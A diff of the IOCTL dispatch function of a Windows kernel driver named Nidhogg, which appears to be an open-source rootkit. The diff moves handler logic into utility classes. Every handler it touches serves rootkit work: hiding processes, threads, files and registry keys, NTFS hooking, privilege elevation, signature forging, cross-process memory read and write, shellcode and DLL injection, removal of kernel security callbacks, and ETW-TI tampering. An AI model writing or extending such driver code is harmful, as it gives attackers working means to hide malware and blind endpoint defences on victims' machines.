@@ -79,17 +79,19 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
-		AutoLock locker(pGlobals.Lock);
 
-		if (pGlobals.ProtectedProcesses.PidsCount == MAX_PIDS) {
+		FastMutex procMutex = NidhoggProccessUtils->GetProcessesLock();
+		AutoLock locker(procMutex);
+
+		if (NidhoggProccessUtils->GetProtectedProcessesCount() == MAX_PIDS) {
 			status = STATUS_TOO_MANY_CONTEXT_IDS;
 			break;
 		}
 		
-		if (FindProcess(*data))
+		if (NidhoggProccessUtils->FindProcess(*data))
 			break;
 
-		if (!AddProcess(*data)) {
+		if (!NidhoggProccessUtils->AddProcess(*data)) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -122,14 +124,15 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		AutoLock locker(pGlobals.Lock);
+		FastMutex procMutex = NidhoggProccessUtils->GetProcessesLock();
+		AutoLock locker(procMutex);
 
-		if (pGlobals.ProtectedProcesses.PidsCount == 0) {
+		if (NidhoggProccessUtils->GetProtectedProcessesCount() == 0) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
 
-		if (!RemoveProcess(*data)) {
+		if (!NidhoggProccessUtils->RemoveProcess(*data)) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
@@ -148,9 +151,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
-		AutoLock locker(pGlobals.Lock);
-		memset(&pGlobals.ProtectedProcesses.Processes, 0, sizeof(pGlobals.ProtectedProcesses.Processes));
-		pGlobals.ProtectedProcesses.PidsCount = 0;
+		NidhoggProccessUtils->ClearProtectedProcesses();
 		break;
 	}
 
@@ -169,7 +170,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		if (!NT_SUCCESS(HideProcess(*data))) {
+		if (!NT_SUCCESS(NidhoggProccessUtils->HideProcess(*data))) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -193,7 +194,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		if (!NT_SUCCESS(UnhideProcess(*data))) {
+		if (!NT_SUCCESS(NidhoggProccessUtils->UnhideProcess(*data))) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -218,7 +219,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		status = ElevateProcess(*data);
+		status = NidhoggProccessUtils->ElevateProcess(*data);
 
 		if (NT_SUCCESS(status))
 			KdPrint((DRIVER_PREFIX "Elevated process with pid %d.\n", *data));
@@ -244,7 +245,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		status = SetProcessSignature(data);
+		status = NidhoggProccessUtils->SetProcessSignature(data);
 
 		if (NT_SUCCESS(status))
 			KdPrint((DRIVER_PREFIX "New signature applied to %d.\n", data->Pid));
@@ -269,12 +270,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (ProtectedProcessesList*)Irp->AssociatedIrp.SystemBuffer;
 
-		AutoLock locker(pGlobals.Lock);
-		data->PidsCount = pGlobals.ProtectedProcesses.PidsCount;
-
-		for (int i = 0; i < pGlobals.ProtectedProcesses.PidsCount; i++) {
-			data->Processes[i] = pGlobals.ProtectedProcesses.Processes[i];
-		}
+		NidhoggProccessUtils->QueryProtectedProcesses(data);
 
 		len += sizeof(ProtectedProcessesList);
 
@@ -302,17 +298,19 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
-		AutoLock locker(tGlobals.Lock);
 
-		if (tGlobals.ProtectedThreads.TidsCount == MAX_TIDS) {
+		FastMutex threadsMutex = NidhoggProccessUtils->GetThreadsLock();
+		AutoLock locker(threadsMutex);
+
+		if (NidhoggProccessUtils->GetProtectedThreadsCount() == MAX_TIDS) {
 			status = STATUS_TOO_MANY_CONTEXT_IDS;
 			break;
 		}
 
-		if (FindThread(*data))
+		if (NidhoggProccessUtils->FindThread(*data))
 			break;
 
-		if (!AddThread(*data)) {
+		if (!NidhoggProccessUtils->AddThread(*data)) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -345,14 +343,15 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		AutoLock locker(tGlobals.Lock);
+		FastMutex threadsMutex = NidhoggProccessUtils->GetThreadsLock();
+		AutoLock locker(threadsMutex);
 
-		if (tGlobals.ProtectedThreads.TidsCount == 0) {
+		if (NidhoggProccessUtils->GetProtectedThreadsCount()  == 0) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
 
-		if (!RemoveThread(*data)) {
+		if (!NidhoggProccessUtils->RemoveThread(*data)) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
@@ -379,7 +378,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		if (!NT_SUCCESS(HideThread(*data))) {
+		if (!NT_SUCCESS(NidhoggProccessUtils->HideThread(*data))) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
@@ -395,9 +394,8 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
-		AutoLock locker(tGlobals.Lock);
-		memset(&tGlobals.ProtectedThreads.Threads, 0, sizeof(tGlobals.ProtectedThreads.Threads));
-		tGlobals.ProtectedThreads.TidsCount = 0;
+
+		NidhoggProccessUtils->ClearProtectedThreads();
 		break;
 	}
 
@@ -417,14 +415,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		auto data = (ThreadsList*)Irp->AssociatedIrp.SystemBuffer;
-
-		AutoLock locker(tGlobals.Lock);
-		data->TidsCount = tGlobals.ProtectedThreads.TidsCount;
-
-		for (int i = 0; i < tGlobals.ProtectedThreads.TidsCount; i++) {
-			data->Threads[i] = tGlobals.ProtectedThreads.Threads[i];
-		}
-
+		NidhoggProccessUtils->QueryProtectedThreads(data);
 		len += sizeof(ThreadsList);
 
 		break;
@@ -454,26 +445,27 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		AutoLock locker(fGlobals.Lock);
+		FastMutex filesMutex = NidhoggFileUtils->GetFileLock();
+		AutoLock locker(filesMutex);
 
-		if (fGlobals.Files.FilesCount == MAX_FILES) {
+		if (NidhoggFileUtils->GetFilesCount() == MAX_FILES) {
 			KdPrint((DRIVER_PREFIX "List is full.\n"));
 			status = STATUS_TOO_MANY_CONTEXT_IDS;
 			break;
 		}
 
-		if (!FindFile(data)) {
-			if (!AddFile(data)) {
+		if (!NidhoggFileUtils->FindFile(data)) {
+			if (!NidhoggFileUtils->AddFile(data)) {
 				KdPrint((DRIVER_PREFIX "Failed to add file.\n"));
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
 
-			if (!fGlobals.Callbacks[0].Activated) {
-				status = InstallNtfsHook(IRP_MJ_CREATE);
+			if (!NidhoggFileUtils->IsCallbackActivated(0)) {
+				status = NidhoggFileUtils->InstallNtfsHook(IRP_MJ_CREATE);
 
 				if (!NT_SUCCESS(status)) {
-					RemoveFile(data);
+					NidhoggFileUtils->RemoveFile(data);
 					KdPrint((DRIVER_PREFIX "Failed to hook ntfs.\n"));
 					break;
 				}
@@ -512,15 +504,16 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		AutoLock locker(fGlobals.Lock);
+		FastMutex filesMutex = NidhoggFileUtils->GetFileLock();
+		AutoLock locker(filesMutex);
 
-		if (!RemoveFile(data)) {
+		if (!NidhoggFileUtils->RemoveFile(data)) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
 
-		if (fGlobals.Files.FilesCount == 0) {
-			status = UninstallNtfsHook(IRP_MJ_CREATE);
+		if (NidhoggFileUtils->GetFilesCount() == 0) {
+			status = NidhoggFileUtils->UninstallNtfsHook(IRP_MJ_CREATE);
 
 			if (!NT_SUCCESS(status)) {
 				KdPrint((DRIVER_PREFIX "Failed to restore the hook.\n"));
@@ -542,21 +535,12 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		AutoLock locker(fGlobals.Lock);
-
-		for (int i = 0; i < fGlobals.Files.FilesCount; i++) {
-			ExFreePoolWithTag(fGlobals.Files.FilesPath[i], DRIVER_TAG);
-			fGlobals.Files.FilesPath[i] = nullptr;
-		}
-
-		fGlobals.Files.FilesCount = 0;
+		NidhoggFileUtils->ClearFilesList();
 		break;
 	}
 
 	case IOCTL_NIDHOGG_QUERY_FILES:
 	{
-		errno_t err;
-
 		if (!Features.FileProtection) {
 			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
 			status = STATUS_UNSUCCESSFUL;
@@ -570,31 +554,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		auto data = (FileItem*)Irp->AssociatedIrp.SystemBuffer;
-		AutoLock locker(fGlobals.Lock);
-
-		if (data->FileIndex == 0) {
-			data->FileIndex = fGlobals.Files.FilesCount;
-
-			if (fGlobals.Files.FilesCount > 0) {
-				err = wcscpy_s(data->FilePath, fGlobals.Files.FilesPath[0]);
-
-				if (err != 0) {
-					status = STATUS_INVALID_USER_BUFFER;
-					KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-				}
-			}
-		}
-		else if (data->FileIndex > fGlobals.Files.FilesCount || data->FileIndex < 0) {
-			status = STATUS_INVALID_PARAMETER;
-		}
-		else {
-			err = wcscpy_s(data->FilePath, fGlobals.Files.FilesPath[data->FileIndex]);
-
-			if (err != 0) {
-				status = STATUS_INVALID_USER_BUFFER;
-				KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-			}
-		}
+		status = NidhoggFileUtils->QueryFiles(data);
 
 		len += sizeof(FileItem);
 
@@ -603,6 +563,8 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_NIDHOGG_PROTECT_REGITEM:
 	{
+		ULONG itemsCount = 0;
+
 		if (!Features.RegistryFeatures) {
 			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
 			status = STATUS_UNSUCCESSFUL;
@@ -619,52 +581,47 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
 
-		if ((data->Type != REG_TYPE_PROTECTED_KEY && data->Type != REG_TYPE_HIDDEN_KEY &&
-			data->Type != REG_TYPE_PROTECTED_VALUE && data->Type != REG_TYPE_HIDDEN_VALUE) ||
+		if ((data->Type != RegProtectedKey && data->Type != RegHiddenKey &&
+			data->Type != RegProtectedValue && data->Type != RegHiddenValue) ||
 			wcslen((*data).KeyPath) == 0) {
 			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		AutoLock locker(rGlobals.Lock);
+		FastMutex regMutex = NidhoggRegistryUtils->GetRegistryLock();
+		AutoLock locker(regMutex);
 
-		if (data->Type == REG_TYPE_PROTECTED_KEY) {
-			if (rGlobals.ProtectedItems.Keys.KeysCount == MAX_REG_ITEMS) {
-				KdPrint((DRIVER_PREFIX "List is full.\n"));
-				status = STATUS_TOO_MANY_CONTEXT_IDS;
-				break;
-			}
-		}
-		else if (data->Type == REG_TYPE_HIDDEN_KEY) {
-			if (rGlobals.HiddenItems.Keys.KeysCount == MAX_REG_ITEMS) {
-				KdPrint((DRIVER_PREFIX "List is full.\n"));
-				status = STATUS_TOO_MANY_CONTEXT_IDS;
-				break;
-			}
-		}
-		else if (data->Type == REG_TYPE_PROTECTED_VALUE) {
-			if (rGlobals.ProtectedItems.Values.ValuesCount == MAX_REG_ITEMS) {
-				KdPrint((DRIVER_PREFIX "List is full.\n"));
-				status = STATUS_TOO_MANY_CONTEXT_IDS;
-				break;
-			}
-		}
-		else if (data->Type == REG_TYPE_HIDDEN_VALUE) {
-			if (rGlobals.HiddenItems.Values.ValuesCount == MAX_REG_ITEMS) {
-				KdPrint((DRIVER_PREFIX "List is full.\n"));
-				status = STATUS_TOO_MANY_CONTEXT_IDS;
-				break;
-			}
-		}
-		else {
+		switch (data->Type) {
+		case RegProtectedKey:
+			itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
+			break;
+		case RegHiddenKey:
+			itemsCount = NidhoggRegistryUtils->GetHiddenKeysCount();
+			break;
+		case RegProtectedValue:
+			itemsCount = NidhoggRegistryUtils->GetProtectedValuesCount();
+			break;
+		case RegHiddenValue:
+			itemsCount = NidhoggRegistryUtils->GetHiddenValuesCount();
+			break;
+		default:
 			KdPrint((DRIVER_PREFIX "Unknown registry object type.\n"));
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		if (!FindRegItem(*data)) {
-			if (!AddRegItem(*data)) {
+		if (!NT_SUCCESS(status))
+			break;
+		
+		if (itemsCount == MAX_REG_ITEMS) {
+			KdPrint((DRIVER_PREFIX "List is full.\n"));
+			status = STATUS_TOO_MANY_CONTEXT_IDS;
+			break;
+		}
+
+		if (!NidhoggRegistryUtils->FindRegItem(data)) {
+			if (!NidhoggRegistryUtils->AddRegItem(data)) {
 				KdPrint((DRIVER_PREFIX "Failed to add new registry item.\n"));
 				status = STATUS_UNSUCCESSFUL;
 				break;
@@ -693,17 +650,18 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
 
-		if ((data->Type != REG_TYPE_PROTECTED_KEY && data->Type != REG_TYPE_HIDDEN_KEY &&
-			data->Type != REG_TYPE_PROTECTED_VALUE && data->Type != REG_TYPE_HIDDEN_VALUE) ||
+		if ((data->Type != RegProtectedKey && data->Type != RegHiddenKey &&
+			data->Type != RegProtectedValue && data->Type != RegHiddenValue) ||
 			wcslen((*data).KeyPath) == 0) {
 			KdPrint((DRIVER_PREFIX "Buffer is empty.\n"));
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		AutoLock locker(rGlobals.Lock);
+		FastMutex regMutex = NidhoggRegistryUtils->GetRegistryLock();
+		AutoLock locker(regMutex);
 
-		if (!RemoveRegItem(*data)) {
+		if (!NidhoggRegistryUtils->RemoveRegItem(data)) {
 			KdPrint((DRIVER_PREFIX "Registry item not found.\n"));
 			status = STATUS_NOT_FOUND;
 			break;
@@ -719,42 +677,17 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		AutoLock registryLocker(rGlobals.Lock);
+		FastMutex regMutex = NidhoggRegistryUtils->GetRegistryLock();
+		AutoLock locker(regMutex);
 
-		for (int i = 0; i < rGlobals.ProtectedItems.Keys.KeysCount; i++) {
-			ExFreePoolWithTag(rGlobals.ProtectedItems.Keys.KeysPath[i], DRIVER_TAG);
-			rGlobals.ProtectedItems.Keys.KeysPath[i] = nullptr;
-		}
-		rGlobals.ProtectedItems.Keys.KeysCount = 0;
-
-		for (int i = 0; i < rGlobals.HiddenItems.Keys.KeysCount; i++) {
-			ExFreePoolWithTag(rGlobals.HiddenItems.Keys.KeysPath[i], DRIVER_TAG);
-			rGlobals.HiddenItems.Keys.KeysPath[i] = nullptr;
-		}
-		rGlobals.HiddenItems.Keys.KeysCount = 0;
-
-		for (int i = 0; i < rGlobals.ProtectedItems.Values.ValuesCount; i++) {
-			ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesPath[i], DRIVER_TAG);
-			ExFreePoolWithTag(rGlobals.ProtectedItems.Values.ValuesName[i], DRIVER_TAG);
-			rGlobals.ProtectedItems.Values.ValuesPath[i] = nullptr;
-			rGlobals.ProtectedItems.Values.ValuesName[i] = nullptr;
-		}
-		rGlobals.ProtectedItems.Values.ValuesCount = 0;
-
-		for (int i = 0; i < rGlobals.HiddenItems.Values.ValuesCount; i++) {
-			ExFreePoolWithTag(rGlobals.HiddenItems.Values.ValuesPath[i], DRIVER_TAG);
-			ExFreePoolWithTag(rGlobals.HiddenItems.Values.ValuesName[i], DRIVER_TAG);
-			rGlobals.HiddenItems.Values.ValuesPath[i] = nullptr;
-			rGlobals.HiddenItems.Values.ValuesName[i] = nullptr;
-		}
-		rGlobals.HiddenItems.Values.ValuesCount = 0;
+		NidhoggRegistryUtils->ClearRegItems();
 
 		break;
 	}
 
 	case IOCTL_NIDHOGG_QUERY_REGITEMS:
 	{
-		errno_t err;
+		ULONG itemsCount = 0;
 
 		if (!Features.RegistryFeatures) {
 			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
@@ -769,143 +702,38 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
-		AutoLock locker(rGlobals.Lock);
 
-		if ((data->Type != REG_TYPE_PROTECTED_KEY && data->Type != REG_TYPE_HIDDEN_KEY &&
-			data->Type != REG_TYPE_PROTECTED_VALUE && data->Type != REG_TYPE_HIDDEN_VALUE)) {
+		FastMutex regMutex = NidhoggRegistryUtils->GetRegistryLock();
+		AutoLock locker(regMutex);
+
+		if ((data->Type != RegProtectedKey && data->Type != RegHiddenKey &&
+			data->Type != RegProtectedValue && data->Type != RegHiddenValue)) {
 			KdPrint((DRIVER_PREFIX "Invalid buffer.\n"));
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		if (data->RegItemsIndex == 0) {
-			if (data->Type == REG_TYPE_PROTECTED_KEY) {
-				data->RegItemsIndex = rGlobals.ProtectedItems.Keys.KeysCount;
-
-				if (rGlobals.ProtectedItems.Keys.KeysCount > 0) {
-					err = wcscpy_s(data->KeyPath, rGlobals.ProtectedItems.Keys.KeysPath[0]);
-
-					if (err != 0) {
-						status = STATUS_INVALID_USER_BUFFER;
-						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-					}
-				}
-			}
-			else if (data->Type == REG_TYPE_HIDDEN_KEY) {
-				data->RegItemsIndex = rGlobals.HiddenItems.Keys.KeysCount;
-
-				if (rGlobals.HiddenItems.Keys.KeysCount > 0) {
-					err = wcscpy_s(data->KeyPath, rGlobals.HiddenItems.Keys.KeysPath[0]);
-
-					if (err != 0) {
-						status = STATUS_INVALID_USER_BUFFER;
-						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-					}
-				}
-			}
-			else if (data->Type == REG_TYPE_PROTECTED_VALUE) {
-				data->RegItemsIndex = rGlobals.ProtectedItems.Values.ValuesCount;
-
-				if (rGlobals.ProtectedItems.Values.ValuesCount > 0) {
-					err = wcscpy_s(data->KeyPath, rGlobals.ProtectedItems.Values.ValuesPath[0]);
-
-					if (err != 0) {
-						status = STATUS_INVALID_USER_BUFFER;
-						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-					}
-
-					err = wcscpy_s(data->ValueName, rGlobals.ProtectedItems.Values.ValuesName[0]);
-
-					if (err != 0) {
-						status = STATUS_INVALID_USER_BUFFER;
-						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-					}
-				}
-			}
-			else if (data->Type == REG_TYPE_HIDDEN_VALUE) {
-				data->RegItemsIndex = rGlobals.HiddenItems.Values.ValuesCount;
-
-				if (rGlobals.HiddenItems.Values.ValuesCount > 0) {
-					err = wcscpy_s(data->KeyPath, rGlobals.HiddenItems.Values.ValuesPath[0]);
-
-					if (err != 0) {
-						status = STATUS_INVALID_USER_BUFFER;
-						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-					}
-
-					err = wcscpy_s(data->ValueName, rGlobals.HiddenItems.Values.ValuesName[0]);
-
-					if (err != 0) {
-						status = STATUS_INVALID_USER_BUFFER;
-						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-					}
-				}
-			}
+		switch (data->Type) {
+		case RegProtectedKey:
+			itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
+			break;
+		case RegHiddenKey:
+			itemsCount = NidhoggRegistryUtils->GetHiddenKeysCount();
+			break;
+		case RegProtectedValue:
+			itemsCount = NidhoggRegistryUtils->GetProtectedValuesCount();
+			break;
+		case RegHiddenValue:
+			itemsCount = NidhoggRegistryUtils->GetHiddenValuesCount();
+			break;
 		}
-		else if ((data->Type == REG_TYPE_PROTECTED_KEY && data->RegItemsIndex > rGlobals.ProtectedItems.Keys.KeysCount) ||
-			(data->Type == REG_TYPE_PROTECTED_VALUE && data->RegItemsIndex > rGlobals.ProtectedItems.Values.ValuesCount) ||
-			(data->Type == REG_TYPE_HIDDEN_KEY && data->RegItemsIndex > rGlobals.HiddenItems.Keys.KeysCount) ||
-			(data->Type == REG_TYPE_HIDDEN_VALUE && data->RegItemsIndex > rGlobals.HiddenItems.Values.ValuesCount) ||
-			data->RegItemsIndex < 0) {
+
+		if (itemsCount == 0 || data->RegItemsIndex > itemsCount) {
 			status = STATUS_INVALID_PARAMETER;
-		}
-		else {
-			if (data->Type == REG_TYPE_PROTECTED_KEY) {
-				if (rGlobals.ProtectedItems.Keys.KeysCount > 0) {
-					err = wcscpy_s(data->KeyPath, rGlobals.ProtectedItems.Keys.KeysPath[data->RegItemsIndex]);
-
-					if (err != 0) {
-						status = STATUS_INVALID_USER_BUFFER;
-						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-					}
-				}
-			}
-			else if (data->Type == REG_TYPE_HIDDEN_KEY) {
-				if (rGlobals.HiddenItems.Keys.KeysCount > 0) {
-					err = wcscpy_s(data->KeyPath, rGlobals.HiddenItems.Keys.KeysPath[data->RegItemsIndex]);
-
-					if (err != 0) {
-						status = STATUS_INVALID_USER_BUFFER;
-						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-					}
-				}
-			}
-			else if (data->Type == REG_TYPE_PROTECTED_VALUE) {
-				if (rGlobals.ProtectedItems.Values.ValuesCount > 0) {
-					err = wcscpy_s(data->KeyPath, rGlobals.ProtectedItems.Values.ValuesPath[data->RegItemsIndex]);
-
-					if (err != 0) {
-						status = STATUS_INVALID_USER_BUFFER;
-						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-					}
-
-					err = wcscpy_s(data->ValueName, rGlobals.ProtectedItems.Values.ValuesName[data->RegItemsIndex]);
-
-					if (err != 0) {
-						status = STATUS_INVALID_USER_BUFFER;
-						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-					}
-				}
-			}
-			else if (data->Type == REG_TYPE_HIDDEN_VALUE) {
-				if (rGlobals.HiddenItems.Values.ValuesCount > 0) {
-					err = wcscpy_s(data->KeyPath, rGlobals.HiddenItems.Values.ValuesPath[data->RegItemsIndex]);
-
-					if (err != 0) {
-						status = STATUS_INVALID_USER_BUFFER;
-						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-					}
-
-					err = wcscpy_s(data->ValueName, rGlobals.HiddenItems.Values.ValuesName[data->RegItemsIndex]);
-
-					if (err != 0) {
-						status = STATUS_INVALID_USER_BUFFER;
-						KdPrint((DRIVER_PREFIX "Failed to copy to user buffer with errno %d\n", err));
-					}
-				}
-			}
+			break;
 		}
 
+		status = NidhoggRegistryUtils->QueryRegItem(data);
 		len += sizeof(RegItem);
 
 		break;
@@ -936,7 +764,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		status = PatchModule(data);
+		status = NidhoggMemoryUtils->PatchModule(data);
 
 		if (NT_SUCCESS(status)) {
 			auto prevIrql = KeGetCurrentIrql();
@@ -982,7 +810,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		status = KeWriteProcessMemory(data->LocalAddress, TargetProcess, data->RemoteAddress, data->Size, data->Mode);
+		status = NidhoggMemoryUtils->KeWriteProcessMemory(data->LocalAddress, TargetProcess, data->RemoteAddress, data->Size, data->Mode);
 
 		ObDereferenceObject(TargetProcess);
 		len += sizeof(PkgReadWriteData);
@@ -1022,7 +850,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		status = KeReadProcessMemory(Process, data->RemoteAddress, data->LocalAddress, data->Size, data->Mode);
+		status = NidhoggMemoryUtils->KeReadProcessMemory(Process, data->RemoteAddress, data->LocalAddress, data->Size, data->Mode);
 
 		ObDereferenceObject(Process);
 		len += sizeof(PkgReadWriteData);
@@ -1052,7 +880,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 				break;
 			}
 
-			status = InjectShellcodeAPC(data);
+			status = NidhoggMemoryUtils->InjectShellcodeAPC(data);
 			break;
 		}
 		case NtCreateThreadExInjection: {
@@ -1062,7 +890,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 				break;
 			}
 
-			status = InjectShellcodeThread(data);
+			status = NidhoggMemoryUtils->InjectShellcodeThread(data);
 			break;
 		}
 		}
@@ -1099,7 +927,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 				break;
 			}
 
-			status = InjectDllAPC(data);
+			status = NidhoggMemoryUtils->InjectDllAPC(data);
 			break;
 		}
 		case NtCreateThreadExInjection: {
@@ -1109,7 +937,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 				break;
 			}
 
-			status = InjectDllThread(data);
+			status = NidhoggMemoryUtils->InjectDllThread(data);
 			break;
 		}
 		}
@@ -1142,7 +970,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		switch (data->Type) {
 		case ObProcessType:
 		case ObThreadType: {
-			status = ListObCallbacks(data);
+			status = NidhoggAntiAnalysis->ListObCallbacks(data);
 			break;
 		}
 		default:
@@ -1170,7 +998,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		case PsCreateProcessType: 
 		case PsCreateThreadType:
 		case PsCreateThreadTypeNonSystemThread: {
-			status = ListPsNotifyRoutines(data, NULL, NULL);
+			status = NidhoggAntiAnalysis->ListPsNotifyRoutines(data, NULL, NULL);
 			break;
 		}
 		default:
@@ -1190,7 +1018,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		auto data = (CmCallbacksList*)Irp->AssociatedIrp.SystemBuffer;
-		status = ListRegistryCallbacks(data, NULL, NULL);
+		status = NidhoggAntiAnalysis->ListRegistryCallbacks(data, NULL, NULL);
 
 		len += sizeof(CmCallbacksList);
 		break;
@@ -1221,7 +1049,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		case ObProcessType:
 		case ObThreadType:
 		case CmRegistryType: {
-			status = RemoveCallback(data);
+			status = NidhoggAntiAnalysis->RemoveCallback(data);
 			break;
 		}
 		default:
@@ -1260,7 +1088,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		case ObProcessType:
 		case ObThreadType: 
 		case CmRegistryType: {
-			status = RestoreCallback(data);
+			status = NidhoggAntiAnalysis->RestoreCallback(data);
 			break;
 		}
 		default:
@@ -1296,7 +1124,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		status = EnableDisableEtwTI((bool)*data);
+		status = NidhoggAntiAnalysis->EnableDisableEtwTI((bool)*data);
 
 		if (!NT_SUCCESS(status))
 			KdPrint((DRIVER_PREFIX "Failed to tamper ETWTI (0x%08X)\n", status));
